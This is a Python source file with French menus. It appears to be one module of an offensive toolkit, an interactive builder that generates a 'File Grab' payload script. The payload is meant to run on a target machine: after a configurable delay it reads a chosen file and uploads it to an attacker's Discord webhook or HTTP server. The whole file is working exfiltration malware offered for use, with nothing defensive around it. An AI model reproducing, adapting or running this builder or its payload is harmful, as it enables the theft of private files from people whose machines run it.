import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration File Grab ===\n\n" + Style.RESET_ALL)
    print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Chemin du fichier à récupérer
    2. Délai avant l'envoi (en secondes)
    3. Nouveau nom du fichier à l'envoi (optionnel)
        
         
          {Fore.YELLOW}Sortie et envoi:
{Fore.WHITE}
    4. Envoi sur Discord
    5. Envoi sur serveur HTTP
    
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
                  """)

def filegrab():
    clear()
    print("=== File Grab Configuration ===\n\n")

    choix = {
        "Chemin du fichier": None,
        "Délai avant envoi": None,
        "Nouveau nom fichier": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
    }

    # -----------------------------------------------
    # Fonctions de configuration
    # -----------------------------------------------

    def chemin_option():
        clear()
        fichier = input("Entrez le chemin complet du fichier à récupérer : ").strip()
        if fichier == "":
            print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
            time.sleep(1)
            affichage()
            return
        # On vérifie que le fichier existe bien sur la machine configurante
        if os.path.isfile(fichier):
            choix["Chemin du fichier"] = fichier
            print(Fore.GREEN + f"Fichier trouvé et défini : {fichier}" + Style.RESET_ALL)
        else:
            # On accepte quand même le chemin car le payload tournera sur une autre machine
            print(Fore.YELLOW + "Attention : ce fichier n'existe pas sur cette machine." + Style.RESET_ALL)
            print(Fore.YELLOW + "Il sera cherché sur la machine cible à l'exécution." + Style.RESET_ALL)
            choix["Chemin du fichier"] = fichier
        time.sleep(1)
        affichage()

    def delai_option():
        clear()
        delai = input("Délai avant l'envoi (secondes) : ")
        try:
            delai = int(delai)
            if delai < 0:
                print(Fore.RED + "Le délai doit être positif." + Style.RESET_ALL)
                time.sleep(1)
                affichage()
                return
            choix["Délai avant envoi"] = delai
            print(f"Délai défini sur {delai} secondes.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def nom_option():
        clear()
        nom = input("Nouveau nom du fichier à l'envoi (laisser vide = nom original) : ").strip()
        choix["Nouveau nom fichier"] = nom if nom != "" else None
        print(f"Nom à l'envoi : {choix['Nouveau nom fichier'] or 'nom original conservé'}.")
        time.sleep(1)
        affichage()

    def discord_option():
        clear()
        discord = input("Entrez l'URL du webhook Discord : ").strip()
        if discord:
            choix["Envoi sur Discord"] = discord
            print("Webhook Discord défini.")
        else:
            choix["Envoi sur Discord"] = None
            print(Fore.YELLOW + "Aucun webhook Discord défini." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    def http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP : ").strip()
        if http:
            choix["Envoi sur serveur HTTP"] = http
            print("URL HTTP définie.")
        else:
            choix["Envoi sur serveur HTTP"] = None
            print(Fore.YELLOW + "Aucune URL HTTP définie." + Style.RESET_ALL)
        time.sleep(1)
        affichage()

    # -----------------------------------------------
    # Liste des options (même ordre que le menu)
    # -----------------------------------------------
    options = [
        ("Chemin du fichier",    chemin_option),
        ("Délai avant envoi",    delai_option),
        ("Nouveau nom fichier",  nom_option),
        ("Envoi sur Discord",    discord_option),
        ("Envoi sur serveur HTTP", http_option),
    ]

    # -----------------------------------------------
    # Génération du payload
    # -----------------------------------------------
    def create_payload():

        # Le chemin est obligatoire
        if choix["Chemin du fichier"] is None:
            print(Fore.RED + "Erreur : vous devez définir le chemin du fichier (option 1)." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return

        # Au moins un mode d'envoi doit être choisi
        if choix["Envoi sur Discord"] is None and choix["Envoi sur serveur HTTP"] is None:
            print(Fore.RED + "Erreur : vous devez choisir au moins un mode d'envoi (option 4 ou 5)." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return

        # Dossier de sortie
        payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
        payload_path = os.path.join(payload_dir, "filegrab_payload.py")
        os.makedirs(payload_dir, exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:
            f.write("import os\n")
            f.write("import time\n")
            f.write("import requests\n")
            f.write("\n")

            # --- Variables de configuration ---
            f.write("# ============================================================\n")
            f.write("# Configuration générée automatiquement\n")
            f.write("# ============================================================\n")
            f.write(f"FICHIER         = {repr(choix['Chemin du fichier'])}\n")
            f.write(f"DELAI           = {choix['Délai avant envoi'] or 0}\n")
            f.write(f"NOM_ENVOI       = {repr(choix['Nouveau nom fichier'])}\n")

            if choix["Envoi sur Discord"]:
                f.write(f"DISCORD_WEBHOOK = {repr(choix['Envoi sur Discord'])}\n")
            else:
                f.write("DISCORD_WEBHOOK = None\n")

            if choix["Envoi sur serveur HTTP"]:
                f.write(f"HTTP_URL        = {repr(choix['Envoi sur serveur HTTP'])}\n")
            else:
                f.write("HTTP_URL        = None\n")

            f.write("\n")

            # --- Logique du grab ---
            f.write("# ============================================================\n")
            f.write("# File Grab\n")
            f.write("# ============================================================\n\n")

            f.write("def lancer_filegrab():\n")

            f.write("    # Délai avant l'envoi\n")
            f.write("    if DELAI > 0:\n")
            f.write("        print(f\"Attente de {DELAI} secondes...\")\n")
            f.write("        time.sleep(DELAI)\n\n")

            f.write("    # Vérification que le fichier existe\n")
            f.write("    if not os.path.isfile(FICHIER):\n")
            f.write("        print(f\"Erreur : fichier introuvable -> {FICHIER}\")\n")
            f.write("        return\n\n")

            f.write("    # Nom du fichier à l'envoi\n")
            f.write("    nom_final = NOM_ENVOI if NOM_ENVOI else os.path.basename(FICHIER)\n\n")

            f.write("    print(f\"Fichier trouvé : {FICHIER}\")\n")
            f.write("    print(f\"Envoi sous le nom : {nom_final}\")\n\n")

            # --- Envoi Discord ---
            f.write("    # ---- Envoi Discord (optionnel) ----\n")
            f.write("    if DISCORD_WEBHOOK:\n")
            f.write("        try:\n")
            f.write("            with open(FICHIER, 'rb') as fichier_obj:\n")
            f.write("                # Discord accepte les fichiers via 'files' dans multipart\n")
            f.write("                reponse = requests.post(\n")
            f.write("                    DISCORD_WEBHOOK,\n")
            f.write("                    files={'file': (nom_final, fichier_obj)},\n")
            f.write("                    data={'content': f'Fichier récupéré : {nom_final}'}\n")
            f.write("                )\n")
            f.write("            print(f\"Envoi Discord : statut {reponse.status_code}\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi Discord : {e}\")\n\n")

            # --- Envoi HTTP ---
            f.write("    # ---- Envoi HTTP (optionnel) ----\n")
            f.write("    if HTTP_URL:\n")
            f.write("        try:\n")
            f.write("            with open(FICHIER, 'rb') as fichier_obj:\n")
            f.write("                reponse = requests.post(\n")
            f.write("                    HTTP_URL,\n")
            f.write("                    files={'file': (nom_final, fichier_obj)}\n")
            f.write("                )\n")
            f.write("            print(f\"Envoi HTTP : statut {reponse.status_code}\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi HTTP : {e}\")\n\n")

            f.write("# Point d'entrée\n")
            f.write("if __name__ == '__main__':\n")
            f.write("    lancer_filegrab()\n")

        print(Fore.GREEN + f"Payload généré dans {payload_path}" + Style.RESET_ALL)
        input("\nAppuyez sur Entrée pour continuer...")

    # -----------------------------------------------
    # Boucle principale
    # -----------------------------------------------
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
                    time.sleep(1)
            except (ValueError, IndexError):
                print(Fore.RED + "Veuillez saisir 'set <num>'" + Style.RESET_ALL)
                time.sleep(1)

        elif cmd.lower() == "show":
            clear()
            print(Fore.CYAN + "\nConfiguration actuelle du module File Grab :\n" + Style.RESET_ALL)
            for option, value in choix.items():
                couleur = Fore.GREEN if value is not None else Fore.RED
                print(f"  {option:30s} : {couleur}{value}{Style.RESET_ALL}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()

        else:
            print(Fore.RED + "Commande inconnue." + Style.RESET_ALL)
            time.sleep(1)

